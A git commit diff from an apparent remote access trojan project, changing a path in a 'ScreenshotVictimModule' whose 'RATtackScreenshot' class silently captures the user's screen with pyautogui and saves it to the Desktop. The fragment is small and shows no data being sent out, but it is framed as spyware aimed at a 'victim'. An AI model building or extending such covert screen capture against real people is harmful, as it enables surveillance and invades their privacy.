eb5026b6ac9d0ce96ed63cff0f2f919fe3623bba
Pradhu007 <55123592+Pradhu007@users.noreply.github.com>
2022-02-19 15:35:22 +1100

    Update Screenshot.py

--- ScreenshotVictimModule/Screenshot.py
+++ ScreenshotVictimModule/Screenshot.py
@@ -3,7 +3,7 @@ import os
 
 class RATtackScreenshot:
     def init(self,screenshotname):
-        desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+        desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop\\')
         pyautogui.screenshot().save(desktop + str(screenshotname))
 
 p1 = RATtackScreenshot("Markdd.jpg")
